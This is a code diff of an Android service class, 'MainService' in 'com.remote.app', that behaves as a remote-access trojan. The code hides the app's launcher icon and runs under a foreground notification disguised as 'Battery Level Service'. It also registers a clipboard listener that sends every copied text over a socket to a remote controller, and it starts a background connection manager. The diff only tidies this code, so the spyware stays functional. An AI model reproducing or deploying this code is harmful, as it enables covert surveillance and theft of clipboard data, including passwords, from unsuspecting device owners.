@@ -1,5 +1,6 @@
 package com.remote.app;
 
+import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -13,111 +14,24 @@ import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.IBinder;
-import android.os.PowerManager;
 import android.support.annotation.Nullable;
 import android.support.annotation.RequiresApi;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.NotificationCompat;
-import android.telephony.ServiceState;
+
+import com.remote.app.socket.IOSocket;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
 public class MainService extends Service {
     private static Context contextOfApplication;
-//    boolean isServiceStarted = false;
-//    PowerManager pm;
-//    PowerManager.WakeLock wl ;
-//
-//    public MainService() {
-//        super();
-//    }
-//
-//    @Override
-//    public IBinder onBind(Intent intent) {
-//        // TODO: Return the communication channel to the service.
-//        //throw new UnsupportedOperationException("Not yet implemented");
-//        return null;
-//    }
-//
-//    @Override
-//    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
-//
-//        start();
-//
-//        // Hide App Icon
-//        PackageManager pkg=this.getPackageManager();
-//        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-//
-//
-//
-//        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
-//            public void onPrimaryClipChanged() {
-//                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-//                if (clipboard.hasPrimaryClip()) {
-//                    ClipData clipData = clipboard.getPrimaryClip();
-//                    if (clipData.getItemCount() > 0) {
-//                        CharSequence text = clipData.getItemAt(0).getText();
-//                        if (text != null) {
-//                            try {
-//                                JSONObject data = new JSONObject();
-//                                data.put("text", text);
-//                                IOSocket.getInstance().getIoSocket().send("_0xCB" , data);
-//                            } catch (JSONException e) {
-//                                e.printStackTrace();
-//                            }
-//                        }
-//                    }
-//                }
-//            }
-//        };
-//
-//        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-//        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
-//
-//
-//        contextOfApplication = this;
-//        ConnectionManager.startAsync(this);
-//        return Service.START_STICKY;
-//    }
-//
-//    public void start(){
-//
-//        if(isServiceStarted) return;
-//
-//        isServiceStarted = true;
-//
-//        try{
-//            pm = (PowerManager)getSystemService(Context.POWER_SERVICE);
-//
-//            if(!pm.isScreenOn()) {
-//                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,"ProcessManger:CollectData");
-//                wl.acquire(300);
-//            }
-//            else if (wl.isHeld()) wl.release();
-//        }
-//        catch(Exception e){
-//            e.printStackTrace();
-//        }
-//
-//    }
-//
-//    @Override
-//    public void onDestroy() {
-//        isServiceStarted = false;
-//        super.onDestroy();
-//        sendBroadcast(new Intent("respawnService"));
-//    }
-//
-//    public static Context getContextOfApplication()
-//    {
-//        return contextOfApplication;
-//    }
 
     @Override
     public void onCreate() {
         super.onCreate();
 
-        PackageManager pkg=this.getPackageManager();
+        PackageManager pkg = this.getPackageManager();
         pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
@@ -127,8 +41,7 @@ public class MainService extends Service {
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
-    private void startMyOwnForeground()
-    {
+    private void startMyOwnForeground() {
         String NOTIFICATION_CHANNEL_ID = "example.permanence";
         String channelName = "Battery Level Service";
         NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
@@ -156,21 +69,19 @@ public class MainService extends Service {
 //        PackageManager pkg=this.getPackageManager();
 //        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
-        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
-            public void onPrimaryClipChanged() {
-                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-                if (clipboard.hasPrimaryClip()) {
-                    ClipData clipData = clipboard.getPrimaryClip();
-                    if (clipData.getItemCount() > 0) {
-                        CharSequence text = clipData.getItemAt(0).getText();
-                        if (text != null) {
-                            try {
-                                JSONObject data = new JSONObject();
-                                data.put("text", text);
-                                IOSocket.getInstance().getIoSocket().send("_0xCB" , data);
-                            } catch (JSONException e) {
-                                e.printStackTrace();
-                            }
+        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = () -> {
+            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+            if (clipboard.hasPrimaryClip()) {
+                ClipData clipData = clipboard.getPrimaryClip();
+                if (clipData.getItemCount() > 0) {
+                    CharSequence text = clipData.getItemAt(0).getText();
+                    if (text != null) {
+                        try {
+                            JSONObject data = new JSONObject();
+                            data.put("text", text);
+                            IOSocket.getInstance().getIoSocket().send("_0xCB", data);
+                        } catch (JSONException e) {
+                            e.printStackTrace();
                         }
                     }
                 }
@@ -179,7 +90,6 @@ public class MainService extends Service {
 
         ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
         clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
-
 
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
@@ -194,15 +104,13 @@ public class MainService extends Service {
     }
 
 
-
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
 
-    public static Context getContextOfApplication()
-    {
+    public static Context getContextOfApplication() {
         return contextOfApplication;
     }
 }
